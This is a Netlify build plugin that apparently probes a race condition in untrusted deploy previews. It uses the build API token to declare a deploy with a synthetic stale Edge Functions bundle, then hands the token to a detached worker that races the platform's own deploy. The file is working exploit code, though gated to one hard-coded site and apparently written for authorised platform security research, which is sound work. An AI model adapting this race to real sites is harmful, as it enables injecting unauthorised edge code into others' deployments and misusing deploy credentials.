import { createHash } from 'node:crypto'
import { spawn, spawnSync } from 'node:child_process'
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, relative, resolve } from 'node:path'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const EXPECTED_API_ORIGIN = 'https://api.netlify.com'
const BRANCH_PREFIX = 'bot/untrusted-preview-probe-'
const A_FUNCTION = 'edge-core-race-a'
const A_ROUTE = '/__nf_edge_core_race_a_20261001'
const B_FUNCTION = 'edge-core-race-b'
const B_ROUTE = '/__nf_edge_core_race_b_20261001'
const EDGE_PREFIX = '.netlify/internal/edge-functions'
const MAX_PUBLIC_FILES = 24
const MAX_PUBLIC_BYTES = 12 * 1024 * 1024

const sleep = (milliseconds) => new Promise((resolvePromise) => setTimeout(resolvePromise, milliseconds))
const hash = (algorithm, bytes) => createHash(algorithm).update(bytes).digest('hex')

const safeError = (error) => ({
  name: error?.constructor?.name || 'Error',
  message: String(error?.message || error).slice(0, 180),
})

const normalizeApiBase = (value) =>
  /^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`

const trustedApiBase = (value) => {
  try {
    const url = new URL(value)
    return (
      url.origin === EXPECTED_API_ORIGIN &&
      url.pathname === '/' &&
      url.search === '' &&
      url.hash === '' &&
      url.username === '' &&
      url.password === ''
    )
  } catch {
    return false
  }
}

const readPolicy = async ({ apiBase, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
      publicRepo: body?.build_settings?.public_repo === true,
    }
  } catch (error) {
    return { requestFailed: true, error: safeError(error) }
  }
}

const collectFiles = (root) => {
  const rootReal = realpathSync(root)
  const records = []
  const visit = (directory, prefix = '') => {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const absolutePath = resolve(directory, entry.name)
      const stats = lstatSync(absolutePath)
      if (stats.isSymbolicLink()) throw new Error('Symlinks are not allowed in the publish input')
      const path = prefix ? `${prefix}/${entry.name}` : entry.name
      if (entry.isDirectory()) {
        visit(absolutePath, path)
        continue
      }
      const pathSafe =
        entry.isFile() &&
        /^[A-Za-z0-9._/-]+$/.test(path) &&
        !path.startsWith('/') &&
        path.split('/').every((segment) => segment !== '.' && segment !== '..')
      if (!pathSafe || dirname(absolutePath) === absolutePath) {
        throw new Error('Unexpected publish file')
      }
      const bytes = readFileSync(absolutePath)
      records.push({ path, bytes, sha1: hash('sha1', bytes) })
    }
  }
  visit(rootReal)
  if (
    records.length === 0 ||
    records.length > MAX_PUBLIC_FILES ||
    records.reduce((total, record) => total + record.bytes.length, 0) > MAX_PUBLIC_BYTES
  ) {
    throw new Error('Publish inventory outside controlled bounds')
  }
  return records
}

const loadCoreVariantB = ({ edgeFunctionsDist, repositoryRoot }) => {
  const dist = resolve(edgeFunctionsDist || '')
  const distStats = lstatSync(dist)
  const distReal = realpathSync(dist)
  const expectedReal = realpathSync(resolve(repositoryRoot, '.netlify/edge-functions-dist'))
  if (!distStats.isDirectory() || distStats.isSymbolicLink() || distReal !== expectedReal) {
    throw new Error('Unexpected Edge dist directory')
  }
  const manifestPath = resolve(distReal, 'manifest.json')
  const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'))
  const routes = Array.isArray(manifest.routes) ? manifest.routes : []
  if (
    routes.length !== 1 ||
    routes[0]?.function !== B_FUNCTION ||
    routes[0]?.path !== B_ROUTE ||
    routes[0]?.pattern !== '^/__nf_edge_core_race_b_20261001/?$'
  ) {
    throw new Error('Unexpected core Edge route')
  }
  const eszip = (manifest.bundles || []).find(
    (bundle) => bundle?.format === 'eszip2' && /^[0-9a-f]{64}\.eszip$/.test(bundle?.asset || ''),
  )
  if (!eszip) throw new Error('Core Edge ESZIP bundle missing')
  const bundlePath = resolve(distReal, eszip.asset)
  if (dirname(bundlePath) !== distReal) throw new Error('Unexpected ESZIP path')
  const bytes = readFileSync(bundlePath)
  const sha256 = hash('sha256', bytes)
  if (eszip.asset !== `${sha256}.eszip`) throw new Error('Core ESZIP digest mismatch')
  return {
    descriptor: eszip,
    bytes,
    sha1: hash('sha1', bytes),
    sha256,
    bundlerVersion: manifest.bundler_version || '16.1.1',
    importMap: manifest.import_map || 'netlify:import-map',
    layers: Array.isArray(manifest.layers) ? manifest.layers : [],
  }
}

const makeVariantA = ({ commitRef, core }) => {
  const root = mkdtempSync(join(tmpdir(), 'netlify-edge-core-race-a-'))
  const input = resolve(root, 'input')
  const archive = resolve(root, 'edge-core-race-a.tar.gz')
  mkdirSync(input)
  const nonce = `netlify-edge-core-race-stale-a-${commitRef.slice(0, 12)}`
  const source = `const NONCE = ${JSON.stringify(nonce)}\n\nexport default async () => Response.json({ schema: 'netlify-edge-core-race.v1', nonce: NONCE, variant: 'repository-stale-a', syntheticOnly: true })\n`
  const route = {
    function: A_FUNCTION,
    pattern: '^/__nf_edge_core_race_a_20261001/?$',
    excluded_patterns: [],
    path: A_ROUTE,
  }
  writeFileSync(
    resolve(input, '___netlify-edge-functions.json'),
    JSON.stringify({
      functions: { [A_FUNCTION]: `${A_FUNCTION}.js` },
      version: 2,
      function_config: {},
      routes: [route],
      post_cache_routes: [],
    }),
  )
  writeFileSync(resolve(input, 'deno.json'), JSON.stringify({ imports: {}, scopes: {} }))
  writeFileSync(resolve(input, `${A_FUNCTION}.js`), source)
  const tar = spawnSync('tar', ['-czf', archive, '-C', input, '.'], {
    encoding: 'utf8',
    env: { ...process.env, COPYFILE_DISABLE: '1' },
    timeout: 20_000,
  })
  if (tar.status !== 0 || !existsSync(archive)) throw new Error('Synthetic Edge tar creation failed')
  const tarBytes = readFileSync(archive)
  const tarSha256 = hash('sha256', tarBytes)
  const manifest = {
    bundles: [
      {
        asset: `${tarSha256}.tar.gz`,
        format: 'tar',
        custom_import_map: false,
        vendor_manifest: false,
      },
      core.descriptor,
    ],
    routes: [route],
    post_cache_routes: [],
    bundler_version: core.bundlerVersion,
    layers: core.layers,
    import_map: core.importMap,
    function_config: {},
  }
  const manifestBytes = Buffer.from(JSON.stringify(manifest))
  return {
    root,
    archive,
    tarBytes,
    tarSha1: hash('sha1', tarBytes),
    tarSha256,
    manifestBytes,
    manifestSha1: hash('sha1', manifestBytes),
  }
}

const declareA = async ({ apiBase, branch, commitRef, deployId, records, token, variantA, core }) => {
  const files = Object.fromEntries(records.map((record) => [record.path, record.sha1]))
  const response = await fetch(
    new URL(`/api/v1/sites/${EXPECTED_SITE_ID}/deploys/${deployId}`, apiBase),
    {
      method: 'PUT',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({
        files,
        functions: {},
        edge_functions: { tar: variantA.tarSha256, eszip2: core.sha256 },
        function_schedules: [],
        functions_config: {},
        async: false,
      }),
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    },
  )
  const body = response.ok ? await response.json() : null
  const requiredFiles = Array.isArray(body?.required) ? body.required : []
  const requiredEdge = Array.isArray(body?.required_edge_functions) ? body.required_edge_functions : []
  const knownFiles = new Set(records.map((record) => record.sha1))
  const knownEdge = new Set([variantA.tarSha256, core.sha256])
  const identityMatches =
    body?.id === deployId &&
    body?.site_id === EXPECTED_SITE_ID &&
    body?.context === 'deploy-preview' &&
    body?.branch === branch &&
    String(body?.review_id) === String(process.env.REVIEW_ID) &&
    body?.commit_ref === commitRef
  const requirementsValid =
    response.ok &&
    requiredFiles.every((value) => knownFiles.has(value)) &&
    requiredEdge.every((value) => knownEdge.has(value)) &&
    new Set(requiredFiles).size === requiredFiles.length &&
    new Set(requiredEdge).size === requiredEdge.length
  return {
    requiredFiles,
    requiredEdge,
    safe: identityMatches && requirementsValid && requiredEdge.includes(variantA.tarSha256),
    evidence: {
      status: response.status,
      ok: response.ok,
      identityMatches,
      requirementsValid,
      requiredFileCount: requiredFiles.length,
      requiredEdgeCount: requiredEdge.length,
      staleARequired: requiredEdge.includes(variantA.tarSha256),
      responseBodyRetained: false,
    },
  }
}

const uploadStatic = async ({ apiBase, deployId, record, token }) => {
  const encodedPath = record.path.split('/').map(encodeURIComponent).join('/')
  const url = new URL(`/api/v1/deploys/${deployId}/files/${encodedPath}`, apiBase)
  url.searchParams.set('size', String(record.bytes.length))
  try {
    const response = await fetch(url, {
      method: 'PUT',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/octet-stream' },
      body: record.bytes,
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    await response.body?.cancel()
    return { ok: response.ok, status: response.status }
  } catch (error) {
    return { ok: false, requestFailed: true, error: safeError(error) }
  }
}

const waitForHandshake = async (path, attempts = 120) => {
  for (let index = 0; index < attempts; index += 1) {
    try {
      const body = JSON.parse(readFileSync(path, 'utf8'))
      if (body?.firstChunkWritten === true) return body
      if (body?.error) return body
    } catch {}
    await sleep(50)
  }
  return null
}

export const onPostBuild = async ({ constants, utils }) => {
  const repositoryRoot = resolve(process.cwd())
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const deployId = process.env.DEPLOY_ID || ''
  const commitRef = process.env.COMMIT_REF || ''
  const branch = process.env.BRANCH || ''
  const apiBase = normalizeApiBase(constants.NETLIFY_API_HOST)
  const token = constants.NETLIFY_API_TOKEN
  const policy =
    trustedApiBase(apiBase) && typeof token === 'string' && token.length > 0
      ? await readPolicy({ apiBase, token })
      : null
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: /^\d+$/.test(process.env.REVIEW_ID || ''),
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    controlledBranch: branch.startsWith(BRANCH_PREFIX),
    buildbotMode: constants.IS_LOCAL === false,
    trustedApiEndpoint: trustedApiBase(apiBase),
    policyReadSucceeded: policy?.status === 200,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    publicRepository: policy?.publicRepo === true,
    deployIdPresent: /^[0-9a-f]{24}$/.test(deployId),
    commitRefPresent: /^[0-9a-f]{40}$/.test(commitRef),
    tokenPresent: typeof token === 'string' && token.length > 0,
    publishDirectoryExpected: relative(repositoryRoot, publishDir) === 'public',
  }
  const result = {
    schema: 'netlify-untrusted-edge-core-race.v1',
    prerequisites,
    policy,
    attempted: false,
    declarationA: null,
    staticUploads: null,
    workerFirstChunkStarted: false,
    workerDetached: false,
    staleASha256: null,
    coreBSha256: null,
    credentialValuesLogged: false,
    responseBodiesRetained: false,
    syntheticOnly: true,
  }
  let variantA = null
  let handshakePath = null
  let worker = null
  if (!Object.values(prerequisites).every(Boolean)) {
    console.log(`NETLIFY_UNTRUSTED_EDGE_CORE_RACE ${JSON.stringify(result)}`)
    utils.build.failBuild('Controlled Edge core-race prerequisites were not satisfied')
    return
  }
  try {
    const publicRecords = collectFiles(publishDir)
    const core = loadCoreVariantB({ edgeFunctionsDist: constants.EDGE_FUNCTIONS_DIST, repositoryRoot })
    variantA = makeVariantA({ commitRef, core })
    result.staleASha256 = variantA.tarSha256
    result.coreBSha256 = core.sha256
    const records = [
      ...publicRecords,
      {
        path: `${EDGE_PREFIX}/manifest.json`,
        bytes: variantA.manifestBytes,
        sha1: variantA.manifestSha1,
      },
      {
        path: `${EDGE_PREFIX}/${variantA.tarSha256}.tar.gz`,
        bytes: variantA.tarBytes,
        sha1: variantA.tarSha1,
      },
      {
        path: `${EDGE_PREFIX}/${core.descriptor.asset}`,
        bytes: core.bytes,
        sha1: core.sha1,
      },
    ]
    if (new Set(records.map((record) => record.path)).size !== records.length) {
      throw new Error('Duplicate deploy paths')
    }
    result.attempted = true
    const declaration = await declareA({
      apiBase,
      branch,
      commitRef,
      deployId,
      records,
      token,
      variantA,
      core,
    })
    result.declarationA = declaration.evidence
    if (!declaration.safe) throw new Error('Initial A declaration was not safely bound')
    const recordsByHash = new Map(records.map((record) => [record.sha1, record]))
    const uploads = []
    for (const requiredHash of declaration.requiredFiles) {
      const record = recordsByHash.get(requiredHash)
      if (!record) throw new Error('Unexpected static upload requirement')
      uploads.push(await uploadStatic({ apiBase, deployId, record, token }))
    }
    result.staticUploads = {
      count: uploads.length,
      allSucceeded: uploads.every((upload) => upload.ok === true),
      statuses: uploads.map((upload) => upload.status || null),
    }
    if (!result.staticUploads.allSucceeded) throw new Error('Initial A static upload failed')

    const workerPath = resolve(repositoryRoot, 'plugins/untrusted-probe/worker.mjs')
    const workerStats = lstatSync(workerPath)
    if (!workerStats.isFile() || workerStats.isSymbolicLink()) throw new Error('Unexpected worker path')
    handshakePath = join(tmpdir(), `netlify-edge-core-race-${deployId}.json`)
    rmSync(handshakePath, { force: true })
    worker = spawn(process.execPath, [workerPath], {
      cwd: repositoryRoot,
      detached: true,
      stdio: 'ignore',
      env: {
        RACE_API_ORIGIN: EXPECTED_API_ORIGIN,
        RACE_TOKEN: token,
        RACE_DEPLOY_ID: deployId,
        RACE_SITE_ID: EXPECTED_SITE_ID,
        RACE_BRANCH: branch,
        RACE_A_SHA256: variantA.tarSha256,
        RACE_B_SHA256: core.sha256,
        RACE_TAR_PATH: variantA.archive,
        RACE_HANDSHAKE_PATH: handshakePath,
      },
    })
    worker.unref()
    result.workerDetached = true
    const handshake = await waitForHandshake(handshakePath)
    if (handshake?.error) throw new Error(`Worker setup failed: ${handshake.error}`)
    result.workerFirstChunkStarted = handshake?.firstChunkWritten === true
    if (!result.workerFirstChunkStarted) throw new Error('Worker did not start the stale A upload')
    console.log(`NETLIFY_UNTRUSTED_EDGE_CORE_RACE ${JSON.stringify(result)}`)
  } catch (error) {
    if (worker && !result.workerFirstChunkStarted) {
      try {
        worker.kill('SIGTERM')
      } catch {}
    }
    result.error = safeError(error)
    console.log(`NETLIFY_UNTRUSTED_EDGE_CORE_RACE ${JSON.stringify(result)}`)
    utils.build.failBuild('Controlled Edge core-race probe failed before the native deploy handoff')
  } finally {
    if (handshakePath) rmSync(handshakePath, { force: true })
    if (variantA?.root && result.workerFirstChunkStarted) {
      rmSync(variantA.root, { recursive: true, force: true })
    } else if (variantA?.root && !result.workerDetached) {
      rmSync(variantA.root, { recursive: true, force: true })
    }
  }
}
